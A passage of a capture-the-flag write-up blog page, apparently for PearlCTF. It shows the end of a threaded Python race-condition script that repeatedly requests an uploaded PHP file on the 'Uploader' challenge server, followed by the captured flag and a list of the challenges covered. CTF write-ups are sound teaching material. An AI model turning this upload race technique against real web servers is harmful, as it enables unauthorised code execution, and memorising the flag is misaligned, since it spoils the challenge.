+<span class="line"><span style="color:#96D0FF">    "Referer"</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"https://uploader-be0b0177dfa5950d.ctf.pearlctf.in/"</span><span style="color:#ADBAC7">,</span></span>
+<span class="line"><span style="color:#96D0FF">    "Upgrade-Insecure-Requests"</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"1"</span><span style="color:#ADBAC7">,</span></span>
+<span class="line"><span style="color:#96D0FF">    "Sec-Fetch-Dest"</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"document"</span><span style="color:#ADBAC7">,</span></span>
+<span class="line"><span style="color:#96D0FF">    "Sec-Fetch-Mode"</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"navigate"</span><span style="color:#ADBAC7">,</span></span>
+<span class="line"><span style="color:#96D0FF">    "Sec-Fetch-Site"</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"same-origin"</span><span style="color:#ADBAC7">,</span></span>
+<span class="line"><span style="color:#96D0FF">    "Sec-Fetch-User"</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"?1"</span><span style="color:#ADBAC7">,</span></span>
+<span class="line"><span style="color:#96D0FF">    "Te"</span><span style="color:#ADBAC7">: </span><span style="color:#96D0FF">"trailers"</span></span>
+<span class="line"><span style="color:#ADBAC7">    }</span></span>
+<span class="line"><span style="color:#F47067">    for</span><span style="color:#ADBAC7"> i </span><span style="color:#F47067">in</span><span style="color:#6CB6FF"> range</span><span style="color:#ADBAC7">(</span><span style="color:#6CB6FF">10000</span><span style="color:#ADBAC7">):</span></span>
+<span class="line"><span style="color:#ADBAC7">        res</span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> requests.get(</span><span style="color:#96D0FF">"https://uploader-be0b0177dfa5950d.ctf.pearlctf.in/uploads/10.80.1.9/.php"</span><span style="color:#ADBAC7">)</span></span>
+<span class="line"><span style="color:#6CB6FF">        print</span><span style="color:#ADBAC7">(res.text)</span></span>
+<span class="line"><span style="color:#ADBAC7">threads </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> []</span></span>
+<span class="line"><span style="color:#F47067">for</span><span style="color:#ADBAC7"> i </span><span style="color:#F47067">in</span><span style="color:#6CB6FF"> range</span><span style="color:#ADBAC7">(</span><span style="color:#6CB6FF">10</span><span style="color:#ADBAC7">):</span></span>
+<span class="line"><span style="color:#ADBAC7">    thread </span><span style="color:#F47067">=</span><span style="color:#ADBAC7"> threading.Thread(</span><span style="color:#F69D50">target</span><span style="color:#F47067">=</span><span style="color:#ADBAC7">getphpinfo)</span></span>
+<span class="line"><span style="color:#ADBAC7">    threads.append(thread)</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">for</span><span style="color:#ADBAC7"> thread </span><span style="color:#F47067">in</span><span style="color:#ADBAC7"> threads:</span></span>
+<span class="line"><span style="color:#ADBAC7">    thread.start()</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#F47067">for</span><span style="color:#ADBAC7"> thread </span><span style="color:#F47067">in</span><span style="color:#ADBAC7"> threads:</span></span>
+<span class="line"><span style="color:#ADBAC7">    thread.join()</span></span>
+<span class="line"></span></code></pre>
+<pre class="astro-code github-dark-dimmed" style="background-color:#22272e;color:#adbac7; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>pearl{d1d_y0u_just_d0uble_r4ce?}</span></span></code></pre>  </div> <aside class="hidden md:block"> <nav class="sticky top-24 text-sm"><p class="mb-3 font-mono text-xs uppercase tracking-wider text-muted-light dark:text-muted-dark">
+on this page
+</p><ul class="space-y-2 border-l border-border-light dark:border-border-dark"><li><a href="#learn-http76-solves50-points" class="-ml-px block border-l border-transparent pl-4 transition-colors hover:border-fg-light dark:hover:border-fg-dark hover:text-fg-light dark:hover:text-fg-dark">learn HTTP(76 Solves/50 Points)</a></li><li><a href="#i-am-a-web-noob75-solves50-points" class="-ml-px block border-l border-transparent pl-4 transition-colors hover:border-fg-light dark:hover:border-fg-dark hover:text-fg-light dark:hover:text-fg-dark">I am a web-noob(75 Solves/50 Points)</a></li><li><a href="#rabbithole58-solves94-points" class="-ml-px block border-l border-transparent pl-4 transition-colors hover:border-fg-light dark:hover:border-fg-dark hover:text-fg-light dark:hover:text-fg-dark">rabbithole(58 Solves/94 points)</a></li><li><a href="#learn-http-better15-solves476-points" class="-ml-px block border-l border-transparent pl-4 transition-colors hover:border-fg-light dark:hover:border-fg-dark hover:text-fg-light dark:hover:text-fg-dark">learn HTTP better(15 Solves/476 Points)</a></li><li><a href="#uploader5-solves499-points" class="-ml-px block border-l border-transparent pl-4 transition-colors hover:border-fg-light dark:hover:border-fg-dark hover:text-fg-light dark:hover:text-fg-dark">Uploader(5 Solves/499 Points)</a></li></ul></nav> </aside> </div> <footer class="mt-16 border-t border-border-light dark:border-border-dark pt-8 text-sm text-muted-light dark:text-muted-dark"> <a href="/blog" class="hover:text-fg-light dark:hover:text-fg-dark">← back to blog</a> </footer> </article>  </main> <footer class="border-t border-border-light dark:border-border-dark"> <div class="mx-auto flex w-full max-w-6xl flex-col items-start justify-between gap-3 px-6 py-8 text-sm text-muted-light dark:text-muted-dark md:flex-row md:items-center"> <p>
+© 2026 oSthing. built with Astro.
+</p> <p class="font-mono text-xs"> <a href="/rss.xml" class="hover:text-fg-light dark:hover:text-fg-dark">rss</a> <span class="mx-2 opacity-50">·</span> <a href="/sitemap.xml" class="hover:text-fg-light dark:hover:text-fg-dark">sitemap</a> </p> </div> </footer> </body></html>
